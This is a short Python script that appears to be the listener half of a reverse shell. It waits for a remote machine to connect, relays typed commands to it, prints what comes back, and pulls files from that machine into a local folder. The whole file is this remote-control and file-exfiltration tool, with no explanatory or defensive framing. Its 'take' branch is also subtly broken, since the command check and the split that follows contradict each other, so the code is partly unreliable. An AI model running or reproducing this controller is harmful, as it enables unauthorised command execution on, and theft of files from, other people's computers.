import socket 

def transfer_files(conn, cmd):
    conn.send(cmd.encode())
    take, path = cmd.split('*')
    # target transfer path on host
    file = open('/home/path/somedirectory'+path, 'wb')

    while True:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            file.write(bits[:-4]) # remove 'DONE' bytes
            file.close()
            print('File transfer successful')
            break
        if 'File not found'.encode() in bits:
            print('Unable to find file')
            break
        file.write(bits)

# listener script for control machine
def init_server():
    host = 'localhost' # set to control/host ip
    port = 8080

    try:
        s = socket.socket()
        s.bind((host, port))
        s.listen(1)
        print('Listening for a connection')

        conn, addr = s.accept()
        print('Connection established', str(addr))

        while True:
            cmd = input('Enter a cmd> ')
            if cmd == 'exit':
                conn.send('exit'.encode())
                break
            elif cmd == 'take':
                transfer_files(conn, cmd)
            else:
                conn.send(cmd.encode()) # unicode str to bytes
                msg = conn.recv(1024).decode()
                print(msg)

        s.close()
           
    except Exception as err:
        print('There was a problem connecting', err)

init_server()